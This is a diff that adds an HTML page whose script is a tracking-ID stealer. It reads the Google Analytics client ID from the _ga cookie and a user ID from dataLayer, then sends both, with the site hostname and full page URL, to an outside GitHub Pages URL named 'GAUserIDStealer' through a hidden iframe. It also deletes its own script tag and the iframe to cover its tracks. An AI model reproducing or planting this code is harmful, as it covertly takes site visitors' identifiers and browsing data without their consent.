@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <titile>Document</titile>
+</head>
+
+<body>
+    <script>
+    function makeid(length) {
+        var result           = '';
+        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        var charactersLength = characters.length;
+        for ( var i = 0; i < length; i++ ) {
+           result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        }
+        return result;
+     }
+     
+     function getgaCid() {
+         var name = "_ga=";
+         var decodedCookie = decodeURIComponent(document.cookie);
+         var ca = decodedCookie.split(';');
+         for(var i = 0; i <ca.length; i++) {
+             var c = ca[i];
+                 while (c.charAt(0) == ' ') {
+                     c = c.substring(1);
+                 }
+                 if (c.indexOf(name) == 0) {
+                     return c.substring(name.length+6, c.length);
+                 }
+         }
+         return "";
+     }
+     
+     function removeScript(){
+         var ss=document.getElementsByTagName('script');
+         for(i=0;i<ss.length;i++){
+             if(ss[i].innerHTML.indexOf("function getgaCid()")!==-1){
+                 ss[i].parentNode.removeChild(ss[i]);
+                 //console.log("Remove script done ver4");
+                 break;
+             }
+         }
+     }
+    
+     function doFlow(){
+    
+         var guhappyId=makeid(5);
+         var ifrm_c = document.createElement('iframe');
+         ifrm_c.setAttribute('id', guhappyId);
+         ifrm_c.setAttribute('class', 'guhappy_steal');
+         ifrm_c.style.display = "none";
+         document.body.appendChild(ifrm_c);
+         
+         var cframe=document.getElementById(guhappyId);
+         
+         
+         cframe.addEventListener("load",function(){
+             setTimeout(function(){
+                 cframe.parentNode.removeChild(cframe);
+                 cframe.parentNode=null;
+             }, 5000);
+             
+         });
+         
+         
+         uid=-1
+         for(i=0;i<dataLayer.length;i++){
+             try{
+                 if('ga_c_id' in dataLayer[i]){
+                     uid=dataLayer[i]['ga_c_id'];
+                     break;
+                 }
+             }catch(e){
+                 console.log("pass");
+             }
+         }
+    
+         cframe.src ="https://mbrsscott.github.io/GAUserIDStealer/B.html?uid=="+uid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href;
+     }
+    </script>
+    <script>
+        console.log('A',window.location.origin);
+        console.log('A window top !== window', window.top!==window);
+    </script>
+</body>
+
+</html>
